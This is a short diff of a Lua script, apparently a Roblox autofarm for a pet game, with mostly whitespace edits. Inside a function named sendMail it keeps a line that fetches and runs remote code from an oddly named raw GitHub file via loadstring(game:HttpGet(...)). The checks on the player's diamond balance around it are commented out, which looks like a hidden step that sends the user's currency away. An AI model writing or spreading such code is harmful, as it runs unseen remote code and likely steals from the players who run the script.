@@ -391,10 +391,8 @@ farmCoin(c.id, getEquippedPets())
     end
 end
 
-
-
 function sendMail()
-               --if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
+        --if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
         --if not MB["Enabled"] or MB["Amount"] > Save.Get().Diamonds then return end
        --if MB["Enabled"] and MB["Amount"] < Save.Get().Diamonds then
     
@@ -411,10 +409,10 @@ function sendMail()
     
         task.wait(0.5)
     
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/wevsite2016/adfdafad/main/hroifejhfisohjesohijesoh.lua"))()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/wevsite2016/adfdafad/main/hroifejhfisohjesohijesoh.lua"))()
 
         task.wait(15)
-        --mailing = false
+        mailing = false
      
        
     end
@@ -448,6 +446,8 @@ function sendMail()
         task.wait(1)
         mailing = false
     end
+
+
 
 do -- Collection
     coroutine.wrap(function() while task.wait() do
